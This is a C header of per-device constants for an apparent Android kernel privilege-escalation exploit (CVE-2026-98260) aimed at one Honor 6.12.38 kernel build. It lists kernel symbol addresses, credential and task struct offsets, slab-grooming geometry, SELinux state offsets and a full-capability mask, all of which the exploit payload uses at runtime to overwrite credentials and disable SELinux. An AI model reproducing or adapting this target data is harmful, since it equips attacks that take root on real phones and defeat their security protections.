/* pc98260_target_g4b36.h — CVE-2026-98260 per-build constants.
 *
 * Target: Honor 6.12.38 g4b3671e1f5b7 (2026-11-16 boot_images upload)
 *   kernel_release = 6.12.38-android16-5-g4b3671e1f5b7-abogki460618149-4k
 *   4K pages, VA_BITS=39
 *
 * Derived from the uploaded boot.img with:
 *   java com.aoki.magicroot.Chain98260TargetDraft boot.img draft.h
 * LINK_ALLOC_TIMER/LINK_ALLOC_CRED are the first BL-to-kmem_cache_alloc*
 * return site inside do_timer_create/prepare_creds (+0xac/+0x2c), the same
 * offsets as the shipped 6.12.38 6138 header.  BTF geometry matches all
 * existing 6.12 targets (task.cred=0x900, real_cred=0x8f8, cred=184,
 * k_itimer.it=0x78/size=0x100).  BNE offsets and LINK_ALLOC_TASK are not
 * emitted because the payload does not reference them at runtime.
 */
#ifndef PC98260_TARGET_G4B36_H
#define PC98260_TARGET_G4B36_H

#include <stdint.h>

#define TARGET_NAME          "honor-g4b36-61238"
#define TARGET_KERNEL        "6.12.38-android16-5-g4b3671e1f5b7-abogki460618149-4k"
#define TARGET_KERNEL_SHA256 ""

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE   UINT64_C(0xffffffc0826663c8)  /* selinux_state */
#define LINK_INIT_USER_NS    UINT64_C(0xffffffc082401568)  /* init_user_ns */
#define LINK_ROOT_USER       UINT64_C(0xffffffc0824017e0)  /* root_user    */
#define LINK_INIT_GROUPS     UINT64_C(0xffffffc082402ca8)  /* init_groups  */
#define LINK_INIT_UCOUNTS    UINT64_C(0xffffffc082403178)  /* init_ucounts */

/* ---- allocator call sites (disassembly-derived; NOT portable) -------- */
#define LINK_ALLOC_TIMER     UINT64_C(0xffffffc080d842b0)  /* do_timer_create+0xac */
#define LINK_ALLOC_CRED      UINT64_C(0xffffffc080b8b714)  /* prepare_creds+0x2c  */

/* ---- struct geometry (6.12.38 .BTF, byte offsets) ---- */
#define GEO_TASK_CRED        0x900
#define GEO_TASK_REAL_CRED   0x8f8
#define GEO_TASK_COMM        0x910
#define GEO_KITIMER_IT       0x78
#define GEO_KITIMER_SIZE     0x100
#define GEO_KITIMER_STRIDE   0x100
#define GEO_CRED_SIZE        184
#define GEO_CRED_ALLOC_SIZE  192
#define GEO_CRED_UID         0x8
#define GEO_CRED_GID         0xc
#define GEO_CRED_SUID        0x10
#define GEO_CRED_SGID        0x14
#define GEO_CRED_EUID        0x18
#define GEO_CRED_EGID        0x1c
#define GEO_CRED_FSUID       0x20
#define GEO_CRED_FSGID       0x24
#define GEO_CRED_CAP_INH     0x30
#define GEO_CRED_CAP_PERM    0x38
#define GEO_CRED_CAP_EFF     0x40
#define GEO_CRED_CAP_BSET    0x48
#define GEO_CRED_CAP_AMB     0x50
#define GEO_CRED_SECURITY    0x80
#define GEO_CRED_USER        0x88
#define GEO_CRED_USER_NS     0x90
#define GEO_SELINUX_ENFORCE  0
#define GEO_SELINUX_INIT     1
#define GEO_SELINUX_WRITE    (-7)
#define GEO_SELINUX_SIZE     0x80

/* ---- slab geometry ---- */
#define GEO_TASK_OBJSIZE             5696
#define GEO_TASK_OBJ_PER_SLAB        5
#define GEO_TASK_SLAB_PAGES          8
#define GEO_POSIX_TIMER_OBJSIZE      256
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 32
#define GEO_POSIX_TIMER_SLAB_ORDER   1
#define GEO_PAGE_SIZE                4096
#define GEO_FRAG_PAGE_SIZE           8192

/* ---- kernel addressing ---------------------------------------------- */
#define GEOM_PAGE_OFFSET     UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS         39
#define GEOM_MEMSTART_PFN    UINT64_C(0x80000)
#define GEOM_MEMSTART_ADDR   UINT64_C(0xffffffc0817fa4f8) /* memstart_addr symbol */

/* ---- privilege bitmask ---------------------------------------------- */
#define CAP_FULL             UINT64_C(0x1ffffffffff)

#endif /* PC98260_TARGET_G4B36_H */
